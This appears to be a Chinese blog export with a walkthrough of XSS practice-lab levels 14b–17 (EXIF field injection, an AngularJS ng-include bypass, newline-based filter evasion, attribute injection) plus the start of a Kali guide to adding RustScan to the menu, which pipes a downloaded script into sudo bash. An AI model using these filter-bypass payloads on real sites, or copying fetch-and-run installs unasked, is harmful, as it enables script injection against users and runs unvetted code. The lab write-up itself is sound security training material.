<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);&lt;/scritp&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_50.png" class="" title="在这里插入图片描述">
<p>script 别td 包含，无法执行js代码</p>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>      //页面加载触发</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;123&#x27;)&quot;</span>&gt;</span>  //数标悬停触发</span><br></pre></td></tr></table></figure>
<p>渲染：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_51.png" class="" title="在这里插入图片描述">


<p>通关成功</p>
<p>源码分析：</p>
<hr>
<h2 id="level14b"><a href="#level14b" class="headerlink" title="level14b"></a>level14b</h2><p>类型：文件上传</p>
<p>解题思路：</p>
<h3 id="EXIF"><a href="#EXIF" class="headerlink" title="*EXIF"></a>*EXIF</h3><blockquote>
<p>图片的 EXIF（Exchangeable Image File Format） 是嵌入在图片文件中的一组元数据（Metadata），记录了拍摄设备、拍摄参数、时间、地理位置等信息。它是数码照片的“数字身份证”，广泛应用于摄影、取证和图片管理<br>EXIF 包含的信息：</p>
<blockquote>
<p>1.基础信息:</p>
<blockquote>
<p>拍摄时间、日期<br>文件格式（如 JPEG、RAW）<br>文件大小和分辨率</p>
<blockquote>
<p>2.设备参数</p>
<blockquote>
<p>相机品牌和型号（如 Canon EOS 5D Mark IV）<br>镜头型号<br>序列号（部分设备）</p>
<blockquote>
<p>3.拍摄参数</p>
<blockquote>
<p>光圈值（F值）<br>快门速度<br>ISO 感光度<br>焦距（如 50mm）<br>白平衡模式<br>曝光补偿</p>
<blockquote>
<p>4.地理位置</p>
<blockquote>
<p>GPS 坐标（需设备开启定位功能）<br>海拔高度（部分设备支持）</p>
<blockquote>
<p>4.其他信息</p>
<blockquote>
<p>版权声明（作者信息）<br>缩略图预览<br>后期编辑软件（如 Photoshop 修改记录）</p>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
</blockquote>
<blockquote>
<p>EXIF 的作用与用途<br>1.摄影学习<br>2.分析他人作品的拍摄参数（如光圈、快门），提升摄影技巧。<br>3.图片管理<br>4.按时间、设备分类整理照片。<br>5.版权保护<br>6.通过 EXIF 中的作者信息证明图片归属。<br>地理位置记录<br>7.旅行摄影时标记拍摄地点。<br>8.取证调查<br>9.验证图片真实性（如时间、设备是否匹配）。</p>
</blockquote>
<blockquote>
<p>问题与解决：<br>1.敏感信息泄露<br>GPS 坐标可能暴露家庭住址或常去地点。<br>2.清除 EXIF</p>
<blockquote>
<p>分享图片前，使用工具删除 EXIF（如 Exif Purge）。</p>
</blockquote>
<p>3.平台自动删除</p>
<blockquote>
<p>微信、微博等社交平台上传图片时会默认清除 EXIF。</p>
</blockquote>
</blockquote>
<p>随便上传正常的照片：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_52.png" class="" title="在这里插入图片描述">
<p>展示了很多项信息，随便修改图片的某一项为xss攻击代码即可通关</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_53.png" class="" title="在这里插入图片描述">
<p>有自动弹窗</p>
<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>解题思路：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_54.png" class="" title="在这里插入图片描述">
<blockquote>
<p>页面技术特征<br>1.AngularJS 框架：代码引入了 angular.min.js，说明页面依赖 AngularJS 动态渲染内容。<br>2.未实现的 ngInclude：注释 <!-- ngInclude: undefined --> 表明存在一个未完成的动态内容加载逻辑，可能需通过特定操作触发</p>
</blockquote>
<h3 id="AngularJS与指令ng-inlcude"><a href="#AngularJS与指令ng-inlcude" class="headerlink" title="*AngularJS与指令ng-inlcude"></a>*AngularJS与指令ng-inlcude</h3><blockquote>
<ol>
<li>ng - include指令特性<blockquote>
<p>ng - include是 Angular JS 框架中的指令，用于在 HTML 页面中动态包含外部文件或片段，通过浏览器的 XHR 请求加载外部文件（需确保文件在同一域名下可访问）。它与服务器端的文件包含（如 PHP）不同，是在浏览器端请求并加载文件内容，然后将其插入到当前页面指定位置。</p>
</blockquote>
</li>
</ol>
</blockquote>
<p>攻击原理：</p>
<blockquote>
<p>默认情况下的，ng-include 只能加载当前页面同源的（相同域名，协议，端口）的文件<br>ng - include加载level1.php时，将name&#x3D;[script]alert(&#x2F;xss&#x2F;)[&#x2F;script]作为参数传递给level1.php。<br>由于level1.php未对name参数做严格过滤，浏览器解析level1.php返回的 HTML 时，会执行恶意脚本alert(&#x2F;xss&#x2F;)，从而触发 XSS 攻击。</p>
</blockquote>
<p>关卡：</p>
<blockquote>
<p>本关漏洞利用分析<br>1.当前关卡过滤：</p>
<blockquote>
<p>传入的src参数会被htmlspecialchars()函数过滤，直接注入script等敏感标签会被转义，无法直接触发 XSS。</p>
</blockquote>
<p>2.结合其他页面漏洞：</p>
<blockquote>
<p>靶场中其他页面（如level1.php）存在 XSS 漏洞（假设name参数输入未过滤）</p>
</blockquote>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">利用ng - include的文件包含特性，构造 Payload：</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&#x27;        	//不行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(&quot;123&quot;)&#x27;</span>&gt;</span>&#x27;	   //不行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&#x27;  	  //不行</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&quot;       //不行</span><br><span class="line"></span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;    //行</span><br><span class="line">src=&quot;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">123</span>&#x27;)&gt;</span>&quot;     //行</span><br><span class="line">src=&#x27;level1.php?name=<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span>&#x27;    //行</span><br><span class="line"></span><br><span class="line"> - 用img标签行</span><br><span class="line"> - onerror外不套单双引号，让浏览器容错，防止过多的单双引号让浏览器识别错误</span><br><span class="line"></span><br><span class="line">为什么有些语句为什么不行呢？</span><br><span class="line">因为语句要考虑的不仅仅是本关的过滤，也要考虑引用对应关卡的过滤</span><br></pre></td></tr></table></figure>

<p>关键流程总结</p>
<blockquote>
<p>ng - include通过浏览器请求加载level1.php，传递带有恶意脚本的参数。<br>存在漏洞的level1.php接收参数后，未过滤直接回显恶意脚本到页面。<br>浏览器解析执行恶意脚本，完成 XSS 攻击。</p>
</blockquote>
<p>这种利用方式绕过了当前关卡的过滤，借助ng - include的特性和其他页面的 XSS 漏洞，实现了跨页面的脚本攻击。</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];   <span class="comment">//获取src的值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;  <span class="comment">//实例化转义--&gt;因此本关的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>解题思路：</p>
<p>类型：输入框类型</p>
<p>输入测试语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>网页回显情况：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_55.png" class="" title="在这里插入图片描述">
<p>查看实例化情况：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_56.png" class="" title="在这里插入图片描述">

<p>此时的页面渲染:</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_57.png" class="" title="在这里插入图片描述">


<p>补充知识：center标签</p>
<blockquote>
<p>[center]标签的作用：将包裹的文本、图片或其他元素在父容器中水平居中显示。<br>HTML4 及更早版本支持 center，但 HTML5 已将其废弃。<br>被弃用的原因：<br>1.HTML 应专注于结构（如标题、段落），样式应交给 CSS 控制。<br>2.维护性和灵活性差：混合样式与结构，导致代码难以维护。<br>3.无法适应复杂布局（如响应式设计）。<br>重点：center 标签内嵌套 script 标签，其中的 JavaScript 代码仍会被浏览器执行</p>
</blockquote>
<p>解读回显信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="symbol">&amp;lt;</span> -&gt;   &lt;</span><br><span class="line"><span class="symbol">&amp;gt;</span> -&gt;   &gt;</span><br><span class="line"><span class="symbol">&amp;nbsp;</span> -&gt; 空格</span><br><span class="line"><span class="symbol">&amp;amp;</span> -&gt; &amp;</span><br><span class="line"></span><br><span class="line"><span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span>alert(&quot;123&quot;);<span class="symbol">&amp;lt;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;gt;</span> 即为：</span><br><span class="line">&lt; &gt;alert(&quot;123&quot;);&lt;  &gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>括号内的双引号没有实例化转义或被替换</li>
<li>特殊符号 &lt; &gt;  空格  &amp; 号被实例化转义</li>
<li>script标签缺失，准确来说被替换为空格</li>
</ul>
<p>换标签：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span> </span><br></pre></td></tr></table></figure>
<p>回显：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_58.png" class="" title="在这里插入图片描述">
<h3 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="*换行符绕过"></a>*换行符绕过</h3><p>在 XSS 攻击中，<strong>换行符绕过过滤</strong>的核心原理是利用浏览器与过滤规则对换行符（<code>\n</code> 或 <code>%0A</code>）的解析差异，使得恶意代码能够绕过安全检测，同时被浏览器正常执行。以下是详细解释和应用场景：</p>
<p>绕过原理：</p>
<ol>
<li><p><strong>浏览器与过滤规则对换行符的解析差异</strong>  </p>
<ul>
<li><strong>浏览器</strong>：在 HTML 中，标签属性之间的换行符通常会被视为<strong>普通空格</strong>，甚至在某些情况下被直接忽略。  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span></span></span><br><span class="line"><span class="tag">   <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- 等同于 &lt;img src=x onerror=alert(1)&gt; --&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>过滤规则</strong>：可能未正确处理换行符，例如：  <ul>
<li>仅检测连续的关键字（如 <code>onerror</code>），但换行符将关键字拆分为 <code>on\nerror</code> 时，绕过黑名单。  </li>
<li>过滤空格但未过滤换行符，导致换行符成为替代分隔符。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>混淆代码结构</strong><br>通过换行符改变代码的视觉结构，使静态正则表达式或简单字符串匹配失效。例如：  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(1)</span>&gt;</span>  <span class="comment">&lt;!-- %0A 是 URL 编码的换行符 --&gt;</span></span><br></pre></td></tr></table></figure>
<p>应用场景：</p>
</li>
<li><p><strong>绕过空格过滤</strong></p>
</li>
</ol>
<ul>
<li><strong>场景</strong>：目标过滤了空格（如删除或转义为 <code>&amp;nbsp;</code>），但允许换行符。  </li>
<li><strong>利用方式</strong>：用换行符（<code>%0A</code>）替代空格分隔标签属性。  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器解析为 <code>&lt;img src=x onerror=alert(1)&gt;</code>。</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p><strong>分割关键字</strong></p>
<ul>
<li><strong>场景</strong>：目标使用黑名单检测连续的关键字（如 <code>onerror</code>）。  </li>
<li><strong>利用方式</strong>：插入换行符拆分关键字，使其无法被正则表达式匹配。  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器会将换行后的内容合并为 <code>onerror</code>，但过滤规则可能因换行符失效。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>绕过属性值闭合检测</strong></p>
<ul>
<li><strong>场景</strong>：目标检查属性值的闭合（如 <code>&quot;</code> 或 <code>&#39;</code>），但未处理换行符。  </li>
<li><strong>利用方式</strong>：在属性中插入换行符，构造未闭合的上下文：  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascri%0Apt:alert(1)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器可能忽略换行符，解析为 <code>javascript:alert(1)</code>。</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>实际绕过示例：</p>
<p>示例 1：绕过空格过滤<br>假设目标过滤空格，但允许换行符：  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=x%0Aonerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>浏览器解析</strong>：<code>&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code>  </li>
<li><strong>绕过效果</strong>：成功触发 <code>onerror</code> 事件。</li>
</ul>
<p>示例 2：分割敏感关键字<br>假设目标过滤 <code>onerror</code> 关键词：  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerr</span></span></span><br><span class="line"><span class="tag"><span class="attr">or</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">即 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x%0Aonerror</span>=<span class="string">alert(</span>&quot;<span class="attr">123</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>浏览器解析</strong>：<code>onerror</code> 被合并，触发事件。  </li>
<li><strong>过滤规则</strong>：可能因换行符无法检测到 <code>onerror</code>。</li>
</ul>
<hr>
<p>由于script会被过滤，所以不使用<br>输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img%0Asrc=x%0Aonerror=alert(&#x27;123&#x27;)&gt;    不用双引号，因为被实例化转义</span><br></pre></td></tr></table></figure>

<p>成功通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="comment">//多个替换过滤  后端过滤了空格-&gt;&amp;nbsp;  未过滤换行符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str5</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>解题思路：</p>
<p>检查源码：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_59.png" class="" title="在这里插入图片描述">
<p>修改地址栏的b,源码也对应修改：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_60.png" class="" title="在这里插入图片描述">
<h3 id="趣事-2"><a href="#趣事-2" class="headerlink" title="*趣事"></a>*趣事</h3><p>将b修改为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">123 onclick=alert()</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_61.png" class="" title="在这里插入图片描述">

<ul>
<li>onclick 成一个属性</li>
</ul>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">123 onmouseover=alert(&quot;123&quot;)</span><br></pre></td></tr></table></figure>

<p>鼠标悬放即可通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//变量获取之后，没有经过过滤就拼接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="服务器设置"><a href="#服务器设置" class="headerlink" title="服务器设置"></a>服务器设置</h1><p>开启php扩展设置php_exif  –&gt;图片读取功能</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>Web</category>
        <category>XSS漏洞</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali右键菜单添加</title>
    <url>/2025/12/25/kali%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95%E6%B7%BB%E5%8A%A0/</url>
    <content><![CDATA[<blockquote>
<blockquote>
<blockquote>
<hr>
<h3 id="🔍-核心原理"><a href="#🔍-核心原理" class="headerlink" title="🔍 核心原理"></a>🔍 <strong>核心原理</strong></h3><table>
<thead>
<tr>
<th>项目</th>
<th>正确做法</th>
<th>错误做法</th>
</tr>
</thead>
<tbody><tr>
<td><strong>安装路径</strong></td>
<td>通过官方脚本安装到 <code>/usr/bin/</code></td>
<td>安装到 <code>~/.cargo/bin/</code>（需额外配置 PATH）</td>
</tr>
<tr>
<td><strong>文件位置</strong></td>
<td>移动到 <code>~/.local/share/applications/</code></td>
<td>保留在桌面或 <code>/usr/share/</code></td>
</tr>
<tr>
<td><strong>Categories 标签</strong></td>
<td><code>kali-reconnaissance;kali-network-information;kali-network-service-discovery;</code></td>
<td><code>Security;</code> 或 <code>kali-network-service-discovery;</code>（缺少 <code>kali-network-information</code>）</td>
</tr>
<tr>
<td><strong>图标</strong></td>
<td><code>Icon=system-run</code></td>
<td><code>kali-rustscan</code>（不存在）</td>
</tr>
<tr>
<td><strong>命令格式</strong></td>
<td><code>Exec=xfce4-terminal -e &quot;bash -c &#39;read -p \&quot;IP: \&quot; ip; rustscan -a $ip -- -sV; read -p \&quot;按 Enter 键退出\&quot;&#39;&quot;</code></td>
<td><code>rustscan --help</code>（只显示帮助）</td>
</tr>
</tbody></table>
<hr>
<h3 id="📌-5-步操作"><a href="#📌-5-步操作" class="headerlink" title="📌 5 步操作"></a>📌 <strong>5 步操作</strong></h3><h4 id="✅-步骤-1：通过-GitHub-安装-rustscan（官方脚本）"><a href="#✅-步骤-1：通过-GitHub-安装-rustscan（官方脚本）" class="headerlink" title="✅ 步骤 1：通过 GitHub 安装 rustscan（官方脚本）"></a>✅ <strong>步骤 1：通过 GitHub 安装 rustscan（官方脚本）</strong></h4>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 安装 curl（如果未安装）</span></span><br><span class="line"><span class="built_in">sudo</span> apt install curl -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 执行官方安装脚本（自动下载到 /usr/bin/）</span></span><br><span class="line">curl -s https://raw.githubusercontent.com/RustScan/RustScan/master/script/install.sh | <span class="built_in">sudo</span> bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>✅ <strong>验证安装</strong>：</p>
<pre><code class="language-bash">which rustscan
# 预期输出：/usr/bin/rustscan

rustscan --version
# 预期输出：2.1.1（或最新版本）
</code></pre>
</blockquote>
<blockquote>
<p>💡 <strong>关键原理</strong>：  </p>
<ul>
<li>安装脚本会自动将二进制文件放到 <strong><code>/usr/bin/</code></strong>（Linux 标准 PATH 路径）  </li>
<li><strong>无需手动配置 PATH</strong>，系统自动识别命令</li>
</ul>
</blockquote>
<hr>
<h4 id="✅-步骤-2：在桌面创建启动器"><a href="#✅-步骤-2：在桌面创建启动器" class="headerlink" title="✅ 步骤 2：在桌面创建启动器"></a>✅ <strong>步骤 2：在桌面创建启动器</strong></h4><ol>
<li><strong>右键桌面空白处</strong> → 选择 <strong>“创建启动器(L)…”</strong>  </li>
<li><strong>填写信息</strong>：一般会自动填充</li>
</ol>
<hr>
<h4 id="✅-步骤-3：移动文件到正确目录"><a href="#✅-步骤-3：移动文件到正确目录" class="headerlink" title="✅ 步骤 3：移动文件到正确目录"></a>✅ <strong>步骤 3：移动文件到正确目录</strong></h4>  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 当前用户的共享文件夹下的 applications 目录</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.local/share/applications （没有则需要创建）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 移动桌面文件到目标目录</span></span><br><span class="line"><span class="built_in">mv</span> ~/Desktop/rustscan.desktop ~/.local/share/applications/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>✅ <strong>验证目录</strong>：</p>
<pre><code class="language-bash">ls -ld ~/.local/share/applications
# 预期输出：drwxr-xr-x 2 ... /home/rookie-hacker/.local/share/applications
</code></pre>
</blockquote>
<hr>
